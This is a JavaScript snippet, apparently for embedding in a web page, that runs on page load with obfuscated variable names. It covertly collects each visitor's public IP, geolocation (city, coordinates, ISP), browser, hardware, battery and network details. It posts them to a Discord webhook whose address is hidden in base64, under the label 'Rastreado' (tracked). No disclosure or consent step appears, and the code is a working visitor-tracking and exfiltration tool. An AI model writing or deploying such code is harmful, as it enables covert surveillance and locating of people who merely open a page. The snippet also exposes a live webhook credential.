document.addEventListener('DOMContentLoaded', function() {
            const x = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MzA3ODg1OTIwMDcyNTE1My9ZUGxZb0VJSzFmWTBLM1ZnZ0FxMGdSeTdpMkRSWXV5SFhHTXBsd1A1WlNlM0J3WHdwNzBaUHduNHN1b0tTWERsMVpXdw'; 

            async function y() {
                const z = await fetch('https://api.ipify.org?format=json');
                const a = (await z.json()).ip;

                const b = await fetch(`https://ipinfo.io/${a}/json`);
                const c = await b.json();

                let d = 'No disponible';
                if (navigator.connection && navigator.connection.type === 'wifi') {
                    try {
                        const e = await navigator.permissions.query({ name: 'network-information' });
                        if (e.state === 'granted') {
                            const f = await navigator.connection.getNetworkInformation();
                            d = f.effectiveType;
                        }
                    } catch (g) {
                        console.error(g);
                    }
                }

                const h = {
                    ip: a,
                    country: c.country || 'No disponible',
                    region: c.region || 'No disponible',
                    city: c.city || 'No disponible',
                    location: c.loc || 'No disponible',
                    org: c.org || 'No disponible',
                    timezone: c.timezone || 'No disponible',
                    userAgent: navigator.userAgent,
                    screenResolution: `${screen.width}x${screen.height}`,
                    language: navigator.language,
                    platform: navigator.platform,
                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'No disponible',
                    hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} núcleos` : 'No disponible',
                    maxTouchPoints: navigator.maxTouchPoints ? `${navigator.maxTouchPoints}` : 'No disponible',
                    batteryLevel: 'No disponible',
                    connectionType: navigator.connection ? navigator.connection.type || 'No disponible' : 'No disponible',
                    effectiveType: navigator.connection ? navigator.connection.effectiveType || 'No disponible' : 'No disponible',
                    downlink: navigator.connection ? `${navigator.connection.downlink} Mbps` : 'No disponible',
                    rtt: navigator.connection ? `${navigator.connection.rtt} ms` : 'No disponible',
                    wifiInfo: d
                };

                if ('getBattery' in navigator) {
                    const i = await navigator.getBattery();
                    h.batteryLevel = `${(i.level * 100).toFixed(2)}%`;
                }

                return h;
            }

            function j(k) {
                const l = {
                    title: "Detalles recopilados",
                    fields: [
                        { name: "IP", value: k.ip, inline: true },
                        { name: "País", value: k.country, inline: true },
                        { name: "Región", value: k.region, inline: true },
                        { name: "Ciudad", value: k.city, inline: true },
                        { name: "Ubicación", value: k.location, inline: true },
                        { name: "Organización", value: k.org, inline: true },
                        { name: "Zona Horaria", value: k.timezone, inline: true },
                        { name: "Navegador", value: k.userAgent, inline: false },
                        { name: "Resolución de Pantalla", value: k.screenResolution, inline: true },
                        { name: "Idioma", value: k.language, inline: true },
                        { name: "Plataforma", value: k.platform, inline: true },
                        { name: "Memoria Dispositivo", value: k.deviceMemory, inline: true },
                        { name: "Núcleos CPU", value: k.hardwareConcurrency, inline: true },
                        { name: "Puntos de Contacto Táctil", value: k.maxTouchPoints, inline: true },
                        { name: "Nivel de Batería", value: k.batteryLevel, inline: true },
                        { name: "Tipo de Conexión", value: k.connectionType, inline: true },
                        { name: "Tipo Efectivo de Conexión", value: k.effectiveType, inline: true },
                        { name: "Ancho de Banda Descarga", value: k.downlink, inline: true },
                        { name: "RTT", value: k.rtt, inline: true },
                        { name: "Información de WiFi", value: k.wifiInfo, inline: true }
                    ],
                    color: 0x2e8b57,
                    footer: {
                        text: "Rastreado"
                    },
                    timestamp: new Date().toISOString()
                };

                fetch(atob(x), {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ embeds: [l] })
                })
                .then(response => response.json())
                .then(data => {
                    console.log(data);
                })
                .catch(error => {
                    console.error(error);
                });
            }

            y().then(z => {
                j(z);
            });
        });
